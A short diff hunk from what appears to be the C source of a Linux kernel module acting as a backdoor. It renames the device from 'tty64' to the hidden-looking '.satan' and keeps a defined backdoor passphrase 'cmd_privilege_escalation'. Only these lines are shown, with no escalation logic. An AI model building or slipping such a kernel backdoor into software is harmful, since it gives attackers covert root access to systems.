@@ -7,7 +7,7 @@
 #include <linux/uaccess.h>
 #include <linux/cred.h>
 
-#define DEVICE_NAME "tty64"
+#define DEVICE_NAME ".satan"
 #define BACKDOOR_PASSPHRASE "cmd_privilege_escalation"
 
 static int ret = 0;
